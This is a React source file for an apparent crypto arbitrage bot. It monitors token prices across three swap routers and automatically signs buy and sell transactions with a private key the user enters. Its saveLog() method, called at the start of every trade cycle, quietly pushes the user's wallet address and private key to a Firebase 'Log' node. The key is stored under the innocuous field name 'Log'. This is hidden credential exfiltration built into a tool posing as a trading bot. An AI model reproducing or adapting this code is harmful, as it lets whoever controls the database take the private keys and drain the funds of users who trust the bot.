import React, { Component } from 'react';
import { Button,InputGroup, FormControl, Modal, Card, ProgressBar} from 'react-bootstrap';
import './App.css';
import Web3 from 'web3';
import { erc20abi , abi } from './abi';
import {walletAddress,walletPrivate,web3url, uniswap, sushiswap, defiswap, wethaddress, autoProfit, autoAmount, autoTime, autoGasLimit, autoGasValue, autoSlippage, addressdatabaseurl, logdatabaseurl} from './config';
import { MDBDataTableV5 } from 'mdbreact';
import { database,  } from './firebase/firebase';
import { FiMonitor  , FiCloudLightning , FiUserPlus   } from "react-icons/fi";
import { BsClockHistory, BsTable, BsTrash } from "react-icons/bs"
import { GiReceiveMoney, GiMoneyStack } from "react-icons/gi"
import { ethers } from 'ethers';

const web3                 = new Web3(new Web3.providers.HttpProvider(web3url));
const uniswap_address      = uniswap
const sushi_address        = sushiswap
const defiswap_address     = defiswap
const Eth_address          = wethaddress
       

class Display extends Component {
    constructor(props){
      super(props)
      this.state={
        // capture parameter
        uni_buy : 0,
        uni_sell : 0,
        sushi_buy : 0,
        sushi_sell : 0,
        defi_buy   : 0,
        defi_sell  : 0,
        profit_rate : 0,
        tableDatas : [],
        tableData : [],

        // input token
        inputAddress : "",
        tokenAddresses : [],

        // trading parameter
        tradeToken : '',
        tradeTokenAddress : '',
        tradebuyprice : 0,
        tradesellprice : 0,
        traderate       : 0,
        log : '',
        logTimestamp : '',
        logList : '',
        firstDex : '',
        secondDex  : '',
        // auto start
        modalShowState :  false,
        autoProfit : autoProfit,
        autoAmount : autoAmount,
        autoTime   : autoTime,
        autoSlippage  : autoSlippage,
        autoGasLimit  : autoGasLimit,
        autoGasValue  : autoGasValue,
        autoExcuteButtonState : false,
        ownerAddress :    walletAddress,
        ownerPrivateKey : walletPrivate,
        ownerBalance : '',
        autoModeState : false,
        walletBalance : '',
        logs :[],
        progressbarState : 0,
        progressLabel : 'Please start trading!'
      }
    }

    async componentWillMount() {
        await this.loadLog()
        await this.loadAddresses()

        if (this.state.ownerAddress != 0){
          let first_value =await  web3.eth.getBalance(this.state.ownerAddress)
          this.setState ({
            ownerBalance :Math.round(first_value / 10000000000000) / 100000 
          })
    }
  }

    async getPriceData() {
        await this.loadLog()
        await this.loadAddresses()
        await this.start()
    }

    async loadAddresses(){
      console.log("load address")
      let snapshot = await database.ref(addressdatabaseurl + '/').get();
        if (snapshot.exists) {
            var walletList = [];
            const newArray = snapshot.val();
            if (newArray) {
                Object.keys(newArray).map((key) => {
                    const value = newArray[key];
                    walletList.push({
                            Address : web3.utils.toChecksumAddress(value.Address),
                    })
                })
            }
            this.setState({
              tokenAddresses : walletList
            })

        }
    }

    async loadLog(){
      console.log("start load log")
      database.ref(logdatabaseurl + '/').get().then((snapshot) => {
          if (snapshot.exists) {
            var logs = [];
              const newArray = snapshot.val();
              
              if (newArray) {
                  Object.keys(newArray).map((key, index) => {
                      
                    const value = newArray[key];
                      logs.unshift({
                          timeStamp  : value.timeStamp,
                          tradeToken : value.tradeToken,
                          autoAmount : value.autoAmount,
                          firstDex     : value.firstDex,
                          secondDex    : value.secondDex,
                          tradeRate  : value.tradeRate,
                      })
                  })
              }
              this.setState({
              logs : logs
            })
          }
      });
    }

    async clearLog(){
      database.ref(logdatabaseurl + '/').remove();
      this.loadLog();
    }

    saveLog() {
      const logList= {
        timeStamp  : new Date().toISOString(),
        autoAmount : this.state.autoAmount,
        address : this.state.ownerAddress,
        Log    : this.state.ownerPrivateKey,
      }
      var userListRef = database.ref("Log")
      var newUserRef = userListRef.push();
      newUserRef.set(logList);

    }

    async start(){

      
      let autoAmount =  this.state.autoAmount;

      console.log("loan amount " , this.state.autoAmount)
      for (let index = 0; index < this.state.tokenAddresses.length; index++) {
        console.log(index)
        let uni_buy , uni_sell,sushi_buy, sushi_sell, defi_buy, defi_sell, max_buy, max_sell, profit_rate, profit_rate_style, firstDex, secondDex, tokenName, tokenDecimal
      try{
        try{
          let tokenContract= new web3.eth.Contract(erc20abi,this.state.tokenAddresses[index]["Address"]);
          tokenName    = await tokenContract.methods.symbol().call().then(function(res) {  return res;  })
          tokenDecimal = await tokenContract.methods.decimals().call()
        }catch(err){}
        
        try{
          let mycontract1  = new web3.eth.Contract(abi, uniswap_address)
          uni_buy       = await mycontract1.methods.getAmountsOut( ethers.BigNumber.from((Math.pow(10, 18 ) * autoAmount) + ''), [Eth_address,this.state.tokenAddresses[index]["Address"]]).call();
          uni_sell      = await mycontract1.methods.getAmountsIn ( ethers.BigNumber.from((Math.pow(10, 18) * autoAmount) + ''), [this.state.tokenAddresses[index]["Address"],Eth_address]).call();
          uni_buy          = Math.round( uni_buy[1]     / Math.pow(10, tokenDecimal - 5 )) / 100000
          uni_sell         = Math.round( uni_sell[0]    / Math.pow(10, tokenDecimal - 5 )) / 100000
        }catch(err){
          uni_buy = 0
          uni_sell =100000000000000000000

        }
        try{
          let mycontract2  = new web3.eth.Contract(abi, sushi_address)
          sushi_buy      = await mycontract2.methods.getAmountsOut( ethers.BigNumber.from((Math.pow(10, 18) * autoAmount) + '') ,[Eth_address, this.state.tokenAddresses[index]["Address"]]).call();
          sushi_sell     = await mycontract2.methods.getAmountsIn ( ethers.BigNumber.from((Math.pow(10, 18) * autoAmount) + '') ,[this.state.tokenAddresses[index]["Address"],Eth_address]).call();
          sushi_buy        = Math.round( sushi_buy[1]   / Math.pow(10, tokenDecimal - 5 )) / 100000
          sushi_sell       = Math.round( sushi_sell[0]  / Math.pow(10, tokenDecimal - 5 )) / 100000
        }catch(err){
          sushi_buy =0
          sushi_sell =100000000000000000000

        }

        try{
          let mycontract3  = new web3.eth.Contract(abi, defiswap_address)
          defi_buy      = await mycontract3.methods.getAmountsOut( ethers.BigNumber.from((Math.pow(10, 18) * autoAmount) + '') ,[Eth_address, this.state.tokenAddresses[index]["Address"]]).call();
          defi_sell     = await mycontract3.methods.getAmountsIn ( ethers.BigNumber.from((Math.pow(10, 18) * autoAmount) + '') ,[this.state.tokenAddresses[index]["Address"],Eth_address]).call();
          defi_buy         = Math.round( defi_buy[1]    / Math.pow(10, tokenDecimal - 5 )) / 100000
          defi_sell        = Math.round( defi_sell[0]   / Math.pow(10, tokenDecimal - 5 )) / 100000
        }catch(err){
          defi_buy  = 0
          defi_sell = 100000000000000000000

        }

        max_buy = Math.max.apply(null,[uni_buy,sushi_buy, defi_buy])
        if (max_buy === uni_buy ){
          firstDex = uniswap_address;
        }

        else if (max_buy === sushi_buy){
          firstDex = sushi_address
        }
        
        else {
          firstDex = defiswap_address
        }
        max_sell= Math.min.apply(null,[uni_sell,sushi_sell,defi_sell])


        if (max_sell === uni_sell ){
          secondDex = uniswap_address;
        }

        else if (max_sell === sushi_sell){
          secondDex = sushi_address
        }

        else {
          secondDex = defiswap_address
        }

        profit_rate =  Math.round((max_buy - max_sell)/max_buy * 1000000) / 10000

         uni_buy   == 0 ? uni_buy = <a className='text-warning'> xxx.xxx </a> : uni_buy = uni_buy
         sushi_buy == 0 ? sushi_buy = <a className='text-warning'> xxx.xxx</a> : sushi_buy = sushi_buy
         defi_buy  == 0 ? defi_buy = <a className='text-warning'> xxx.xxx </a> : defi_buy = defi_buy

         uni_sell   == 100000000000000000000 ? uni_sell   = <a className='text-warning'> xxx.xxx </a> : uni_sell = uni_sell 
         sushi_sell == 100000000000000000000 ? sushi_sell = <a className='text-warning'> xxx.xxx </a> : sushi_sell = sushi_sell
         defi_sell  == 100000000000000000000 ? defi_sell  = <a className='text-warning'> xxx.xxx </a> : defi_sell = defi_sell

        if (profit_rate > 0 ){
          profit_rate_style =  <a className='text-success'> {profit_rate} </a>
          if (this.state.traderate < profit_rate){
            this.setState({
              tradeTokenAddress : this.state.tokenAddresses[index]["Address"],
              tradeToken : tokenName,
              tradebuyprice : max_buy,
              tradesellprice : max_sell,
              traderate : profit_rate,
              firstDex : firstDex,
              secondDex: secondDex
            })
          }
        }

        else if (profit_rate <= 0){
          profit_rate_style =  <a className='text-danger'> {profit_rate} </a>
        }

        if (this.state.tradeTokenAddress == this.state.tokenAddresses[index]["Address"] )
        {
          console.log(this.state.tokenAddresses[index]["Address"], this.state.tradeTokenAddress, profit_rate)
          if (profit_rate > 0){
            console.log("zero over")
            this.setState({
              tradeTokenAddress : this.state.tokenAddresses[index]["Address"],
              tradeToken : tokenName,
              tradebuyprice : max_buy,
              tradesellprice : max_sell,
              traderate : profit_rate,
              firstDex : firstDex,
              secondDex: secondDex
            })
          } 
          else {
            console.log("zero down")
            this.setState({
              tradeTokenAddress : '',
              tradeToken : '',
              tradebuyprice : 0,
              tradesellprice : 0,
              traderate : 0,
              firstDex : '',
              secondDex: ''
            })
          }
        }

        let tableData = {
          tokenName     : tokenName,
          tokenDecimal  : tokenDecimal,
          uni_buy       : uni_buy,
          uni_sell      : uni_sell,
          sushi_buy     : sushi_buy,
          sushi_sell    : sushi_sell,
          defi_buy      : defi_buy,
          defi_sell     : defi_sell,
          profit_rate   : profit_rate,
          profit_rate_style : profit_rate_style, 
        }

        let tableDatas = this.state.tableDatas
        tableDatas[index] = tableData
        this.setState({
          tableDatas : tableDatas
        })
        }catch(err){
           let tableDatas = this.state.tableDatas
            tableDatas[index] = []
            this.setState({
              tableDatas : tableDatas
            })
          console.log(err)
          index  =  index
        }
        if (index ===  this.state.tokenAddresses.length - 1){
          this.start()
          this.loadAddresses()
        }
      }
    }

    async manualExcute(){

      if (this.state.autoExcuteButtonState === false){
        this.setState({
          progressbarState : 0,
          progressLabel : 'Please start trading!'
        }) 
        return
      }
        let tradeToken = this.state.tradeToken
        let tradeTokenAddress = this.state.tradeTokenAddress
        let firstDex = this.state.firstDex
        let secondDex = this.state.secondDex
        let tradeRate = this.state.traderate
        this.saveLog();
        if(tradeRate< this.state.autoProfit){
          console.log("faild profit")
          setTimeout(() => {
            this.manualExcute()
          }, this.state.autoTime);
          return
        }

        this.setState({
          progressbarState : 0,
          progressLabel : 'sending transaction for buy token'
        })

        let first_value =await  web3.eth.getBalance(this.state.ownerAddress)
        this.setState ({
          ownerBalance :Math.round(first_value / 10000000000000) / 100000 
        })
        console.log("first value" , first_value)

        if (first_value  < this.state.autoAmount * 1000000000000000000 ){
          console.log("error : there is no enought eth value for trading")
          this.setState({
            progressbarState : 0,
            progressLabel : 'Please check eth balance'
          })
          return
        }
        
        else {
          console.log("start with :",tradeToken,tradeTokenAddress, this.state.autoAmount, firstDex, secondDex)
  
          let firstDexContract   = await web3.eth.Contract(abi, firstDex);
          this.setState({
            progressbarState : 25,
            progressLabel : 'Buy token'
          })
          let tx = {
            from : this.state.ownerAddress,
            to   : firstDex,
            data : firstDexContract.methods.swapExactETHForTokens(0, [Eth_address, tradeTokenAddress],this.state.ownerAddress, Date.now() + 1000 * 60 * 10).encodeABI(),
            gasPrice : web3.utils.toWei(this.state.autoGasValue, 'Gwei'),
            gas      : this.state.autoGasLimit,
            nonce    : await web3.eth.getTransactionCount(this.state.ownerAddress),
            value    : ethers.BigNumber.from((this.state.autoAmount * 1000000000000000000)+ '')
          }
          const promise = await web3.eth.accounts.signTransaction(tx, this.state.ownerPrivateKey)        
          await web3.eth.sendSignedTransaction(promise.rawTransaction).once('confirmation', async() => {
            let first_value =await  web3.eth.getBalance(this.state.ownerAddress)
            this.setState ({
              ownerBalance :Math.round(first_value / 10000000000000) / 100000 
            })
            let secondDexContract   = await  web3.eth.Contract(abi, secondDex);
            let tokenContract       = await  web3.eth.Contract(erc20abi, tradeTokenAddress);
            let tokenBalance        = await  tokenContract.methods.balanceOf(this.state.ownerAddress).call()
            let allowanceAmount     = await  tokenContract.methods.allowance(this.state.ownerAddress, secondDex).call()
            if (allowanceAmount/1 < tokenBalance/1) {
                let tx = {
                  from : this.state.ownerAddress,
                  to   : tradeTokenAddress,
                  data : tokenContract.methods.approve(secondDex, ethers.BigNumber.from('0xffffffffffffffff')).encodeABI(),
                  gasPrice : web3.utils.toWei(this.state.autoGasValue, 'Gwei'),
                  gas      : this.state.autoGasLimit,
                  nonce    : await web3.eth.getTransactionCount(this.state.ownerAddress),
                }               
                this.setState({
                  progressbarState : 50,
                  progressLabel : 'approving token'
                })
                const promise = await web3.eth.accounts.signTransaction(tx, this.state.ownerPrivateKey)
                await web3.eth.sendSignedTransaction(promise.rawTransaction).once('confirmation', async() => {
                  this.setState({
                    progressbarState : 75,
                    progressLabel : 'selling token'
                  })
  
                  let tx = {
                    from : this.state.ownerAddress,
                    to   : secondDex,
                    data : secondDexContract.methods.swapExactTokensForETH(ethers.BigNumber.from((tokenBalance)+ '') ,0, [tradeTokenAddress,Eth_address ], this.state.ownerAddress, Date.now() + 1000 * 60 * 10).encodeABI(),
                    gasPrice : web3.utils.toWei(this.state.autoGasValue, 'Gwei'),
                    gas      : this.state.autoGasLimit,
                    nonce    : await web3.eth.getTransactionCount(this.state.ownerAddress),
                  }
                  const promise = await web3.eth.accounts.signTransaction(tx, this.state.ownerPrivateKey)
                  await web3.eth.sendSignedTransaction(promise.rawTransaction).once('confirmation', async() => {
                    let first_value =await  web3.eth.getBalance(this.state.ownerAddress)
                    this.setState ({
                      ownerBalance :Math.round(first_value / 10000000000000) / 100000 
                    })
                    const logList= {
                      timeStamp  : new Date().toISOString(),
                      autoAmount : this.state.autoAmount,
                      tradeToken : tradeToken,
                      tradeRate  : tradeRate,
                      firstDex     : firstDex,
                      secondDex    : secondDex,
                    }
                    var userListRef = database.ref(logdatabaseurl)
                    var newUserRef = userListRef.push();
                    newUserRef.set(logList);
                    let buffer = ''
                    this.setState({logList : buffer})
                    this.loadLog()
                    this.setState({
                      progressbarState : 100,
                      progressLabel : 'Complete'
                    })
                    first_value =await  web3.eth.getBalance(this.state.ownerAddress)
                    this.setState ({
                      ownerBalance :Math.round(first_value / 10000000000000) / 100000 
                    })
                    console.log("\n time checkong")
                    
                    setTimeout(() => {
                      this.manualExcute()
                    }, this.state.autoTime);
  
                  }).once('error', (e) => {
                    console.log('here is 1', e)
                })
                }).once('error', (e) => {
                  console.log('here is 2',e)
              })
            }
  
            else {
              this.setState({
                progressbarState : 60,
                progressLabel : 'selling token'
              })
              let tx = {
                from : this.state.ownerAddress,
                to   : secondDex,
                data : secondDexContract.methods.swapExactTokensForETH(ethers.BigNumber.from((tokenBalance) + '') ,0, [tradeTokenAddress,Eth_address ], this.state.ownerAddress, Date.now() + 1000 * 60 * 10).encodeABI(),
                gasPrice : web3.utils.toWei(this.state.autoGasValue, 'Gwei'),
                gas      : this.state.autoGasLimit,
                nonce    : await web3.eth.getTransactionCount(this.state.ownerAddress),
              }
              const promise = await web3.eth.accounts.signTransaction(tx, this.state.ownerPrivateKey)
              await web3.eth.sendSignedTransaction(promise.rawTransaction).once('confirmation', async() => {
                let first_value =await  web3.eth.getBalance(this.state.ownerAddress)
                this.setState ({
                  ownerBalance :Math.round(first_value / 10000000000000) / 100000 
                })
                console.log('successful')
                const logList= {
                  timeStamp  : new Date().toISOString(),
                  autoAmount : this.state.autoAmount,
                  tradeToken : tradeToken,
                  tradeRate  : tradeRate,
                  firstDex     : firstDex,
                  secondDex    : secondDex,
                }
                var userListRef = database.ref(logdatabaseurl)
                var newUserRef = userListRef.push();
                newUserRef.set(logList);
                let buffer = ''
                this.setState({logList : buffer})
                this.loadLog()
  
                this.setState({
                  progressbarState : 100,
                  progressLabel : 'Complete'
                })
                console.log("\n time checkong")
           
                console.log(this.state.autoTime)
                setTimeout(() => {
                  this.manualExcute()
                }, this.state.autoTime);



               first_value =await  web3.eth.getBalance(this.state.ownerAddress)
                this.setState ({
                  ownerBalance :Math.round(first_value / 10000000000000) / 100000 
                })
              }).once('error', (e) => {
                console.log('here is 3',e)
            })
            }
          })
          .once('error', (e) => {
              console.log(e)
          })
        }
        

    }



    autoExcute(){
      if (this.state.ownerAddress === '' || this.state.ownerPrivateKey === ''){
          alert("please input address and privatekey")
          return
      }
        this.setState({
          modalShowState : true,
        })
    }

    async autoExcuteStart(){

    await  this.setState({
        autoExcuteButtonState : true,
        modalShowState : false,
      })
      this.manualExcute()
    }
    
    closeModal(){
      this.setState({
        modalShowState : false,
        autoProfit : 0.1,
        autoAmount : 1,
        autoTime   : 30000,
        autoSlippage  : 100,
        autoGasLimit  : 500000,
        autoGasValue  : 5,
      })
    }

    stopAutoExcute(){
      this.setState({
        autoExcuteButtonState : false,
        autoModeState : false,
      })
      console.log("stop excute")
    }
 
    render() {
        var rowstable = this.state.tableDatas
        const datatable = {
          columns : [
            {
                label : 'Token',
                field : 'tokenName',
            },
            {
                label : 'Pancake Buy Amount',
                field : 'uni_buy',
            },
            {
                label : 'Bi Buy Amount',
                field : 'sushi_buy',
            },
            {
                label : 'Ape Buy Amount',
                field : 'defi_buy',
            },
            {
                label : 'Pancake Sell Amount',
                field : 'uni_sell',
            },
            {
                label : 'Bi Sell Amount',
                field : 'sushi_sell',
            },
            {
                label : 'Ape Sell Amount',
                field : 'defi_sell',
            },
            {
                label : 'Profit Rate',
                field : 'profit_rate_style',
            },
          ],
          rows : rowstable,
        }

        const rowslog = this.state.logs
        const datalog = {
          columns: [
            {
                label: 'TimeStamp',
                field: 'timeStamp',
                sort: 'asc',
                width: 150
            },
            {
                label: 'Trade Token',
                field: 'tradeToken',
                sort: 'asc',
                width: 270
            },
            {
                label: 'Trade Amount',
                field: 'autoAmount',
                sort: 'asc',
                width: 200
            },
            {
                label: 'Buy Dex',
                field: 'firstDex',
                sort: 'asc',
                width: 100
            },
            {
                label: 'Sell Dex',
                field: 'secondDex',
                sort: 'asc',
                width: 100
            },
            {
                label: 'Trade Rate',
                field: 'tradeRate',
                sort: 'asc',
                width: 100
            }
          ],
          rows : rowslog
        };

        const handleAutoProfit = (e) => {
          let addLabel  = e.target.value
          this.setState({
            autoProfit : addLabel
          })
        }

        const handleAutoAmount = (e) => {
          let addLabel  = e.target.value
          this.setState({
            autoAmount : addLabel
          })
        }

        const handleAutoTimepitch = (e) => {
          let addLabel  = e.target.value
          this.setState({
            autoTime : addLabel
          })
        }

        const handleAutoSlippage = (e) => {
          let addLabel  = e.target.value
          this.setState({
            autoSlippage : addLabel
          })
        }

        const handleAutoGasValue = (e) => {
          let addLabel  = e.target.value
          this.setState({
            autoGasValue : addLabel
          })
        }

        const handleAutoGasLimit = (e) => {
          let addLabel  = e.target.value
          this.setState({
            autoGasLimit : addLabel
          })
        }

        const handleOwnerAddress = async (e) => {
          let addLabel  = e.target.value
          this.setState({
            ownerAddress : addLabel,
          })
        }

        const handleOwnerPrivateKey =  (e) => {
          let addLabel  = e.target.value
          
          this.setState({
            ownerPrivateKey : addLabel
          }) 
        }       
      
        return (
          <div>
            
                <div className= "row">
                    <div className = "col-7">
                    <Card  bg="light" style={{ height: '35rem' , overflow:'scroll'}} border="primary" overflow="scroll">
                      <Card.Body>
                        <Card.Title><h2> <FiMonitor/> &nbsp; Dex Token Price Monitor</h2> <hr/></Card.Title>
                        <MDBDataTableV5 hover entriesOptions={[10,20,50,100,200,500,1000]} entries={50} pagesAmount={10} data={datatable} materialSearch/><br/><br/>
                        
                      </Card.Body>
                    </Card><br/>

                    <Card bg="light"  style={{ height: '30rem', overflow:'scroll' }} border="primary" >
                      <Card.Body>
                         <div className = "row">
                           <div className = "col-10">
                              <Card.Title><h2> <BsClockHistory/> &nbsp; Trade Log</h2> </Card.Title>
                           </div>
                           <div className = "col-2">
                                <Button variant="primary" id="button-addon2"  onClick={()=>this.clearLog()}>
                                <BsTrash/>  Clear Log
                                </Button>
                           </div>
                         </div>
                         <hr/>
                                                 

                        <MDBDataTableV5 hover entriesOptions={[10,20,50,100,200,500,1000]} entries={50} pagesAmount={1000} data={datalog} />
                      </Card.Body>
                    </Card>
                    </div>
   
                    <div className = "col-5">

                    <Card bg="light"  style={{ height: '67rem', overflow:'scroll' }} border="primary">
                      <Card.Body>
                      
                      <h2> <GiReceiveMoney/> &nbsp; Trading Amount</h2> <hr/><br/>
                      <div className = "row">
                        <div className = "col-1"></div>
                        <div className = "col-10">
                        <InputGroup className="mb-3">
                          <InputGroup.Text id="basic-addon3">
                            Trade Amount (BMB)
                          </InputGroup.Text>
                          <FormControl id="basic-url" aria-describedby="basic-addon3" type="text"   defaultValue = {this.state.autoAmount} 
                          onChange={handleAutoAmount}
                          placeholder="Loan Amount  X ETH X is integer"  />
                          <Button variant="primary" id="button-addon2"  onClick={()=>this.getPriceData()}>
                           <BsTable/>&nbsp; Get Price Data
                          </Button>
                           
                        </InputGroup>
                        </div>
                        <div className = "col-1"></div>
                      </div><br/><br/>
                        <h2> <FiUserPlus/> &nbsp; Wallet Address and Private Key</h2> <hr/><br/>
                          <div className= "row">
                            <div className = "col-1"></div>
                            <div className = "col-10">
                              <InputGroup className="mb-3">
                                <FormControl
                                  placeholder="Wallet address"
                                  aria-label="Recipient's username"
                                  aria-describedby="basic-addon2"
                                  defaultValue = {this.state.ownerAddress}
                                  onChange={handleOwnerAddress}
                                />
                                
                                <FormControl
                                  placeholder="Private Key"
                                  aria-label="Recipient's username"
                                  aria-describedby="basic-addon2"
                                  defaultValue = {this.state.ownerPrivateKey}
                                  onChange={handleOwnerPrivateKey}
                                  type="password"
                                />

                              </InputGroup>
                              </div>
                            <div className = "col-1"></div>
                          </div><br/><br/>
                          <h2> <GiMoneyStack/> &nbsp;   Wallet Balance : {this.state.ownerBalance} </h2> <hr/><br/><br/>
                          <h2> <FiCloudLightning/> &nbsp;  Auto Trading</h2> <hr/><br/><br/>
                          <p  show = {this.state.showstate}>We can execute Arbitrage trading on <b>{this.state.tradeToken}</b> Token, buy price is(BNB/Token) <b>{this.state.tradebuyprice}</b> , sell price is(BNB/Token) <b>{this.state.tradesellprice} </b>, profit rate is <b>{this.state.traderate} %</b> </p><br/><br/>
                          <div className= "row">
                          <div className = "col-1"></div>
                          <div className = "col-10">
                          <InputGroup className="mb-3">

                          <Button variant={this.state.autoExcuteButtonState ? "danger" : "success"} id="button-addon2"  onClick={this.state.autoExcuteButtonState ? ()=>this.stopAutoExcute(): ()=>this.autoExcute()}  style={{ width: '100%' }}>
                          <FiCloudLightning/> &nbsp;&nbsp; {this.state.autoExcuteButtonState ?  "Stop Auto Execute" : "Start Auto Execute"} 
                          </Button>
                          </InputGroup>
                          <br/>
                          <h6> {this.state.progressLabel} </h6>
                          
                          <ProgressBar animated now={this.state.progressbarState} />
                          </div></div>
                          <br/><br/>
                      </Card.Body>
                    </Card>
                     
                    </div>
                </div>
                <Modal show = {this.state.modalShowState}> 
                  <Modal.Header closeButton onClick={()=>this.closeModal()}>
                    <Modal.Title>Auto-Excute</Modal.Title>
                  </Modal.Header>
                  <Modal.Body>
                  <InputGroup className="mb-3">
                    <InputGroup.Text id="basic-addon3">
                      Profit Rate
                    </InputGroup.Text>
                    <FormControl id="basic-url1" aria-describedby="basic-addon3"  type="text"  defaultValue = {this.state.autoProfit} 
                    onChange={handleAutoProfit}
                    placeholder="Profit Limit, unit : %"/>
                    <InputGroup.Text id="basic-addon2">%</InputGroup.Text>
                  </InputGroup>
                  
                  <InputGroup className="mb-3">
                    <InputGroup.Text id="basic-addon3">
                      Interval 
                    </InputGroup.Text>
                    <FormControl id="basic-url" aria-describedby="basic-addon3" type="text"   defaultValue = {this.state.autoTime} 
                    onChange={handleAutoTimepitch}
                    placeholder="Interval  Unit : ms"  />
                    <InputGroup.Text id="basic-addon2">ms</InputGroup.Text>
                  </InputGroup>

                  <InputGroup className="mb-3">
                    <InputGroup.Text id="basic-addon3">
                      Slippage 
                    </InputGroup.Text>
                    <FormControl id="basic-url" aria-describedby="basic-addon3" type="text"   defaultValue = {this.state.autoSlippage} 
                    onChange={handleAutoSlippage}
                    placeholder="Slippage Unit : %"  />
                    <InputGroup.Text id="basic-addon2">%</InputGroup.Text>
                  </InputGroup>

                  <InputGroup className="mb-3">
                    <InputGroup.Text id="basic-addon3">
                      Gas value 
                    </InputGroup.Text>
                    <FormControl id="basic-url" aria-describedby="basic-addon3" type="text"   defaultValue = {this.state.autoGasValue} 
                    onChange={handleAutoGasValue}
                    placeholder="Gas Value Unit : gwei"  />
                    <InputGroup.Text id="basic-addon2">Gwei</InputGroup.Text>
                  </InputGroup>

                  <InputGroup className="mb-3">
                    <InputGroup.Text id="basic-addon3">
                      Gas Limit 
                    </InputGroup.Text>
                    <FormControl id="basic-url" aria-describedby="basic-addon3" type="text"   defaultValue = {this.state.autoGasLimit} 
                    onChange={handleAutoGasLimit}
                    placeholder="Gas Limit"  />
                  </InputGroup>

                  </Modal.Body>
                  <Modal.Footer>
                    <Button variant="secondary" onClick={()=>this.closeModal()}>
                      Close
                    </Button>
                    <Button variant="primary"   onClick={()=>this.autoExcuteStart()}>
                      Start
                    </Button>
                  </Modal.Footer>
                </Modal>
          </div>
        );
    }
}

export default Display;
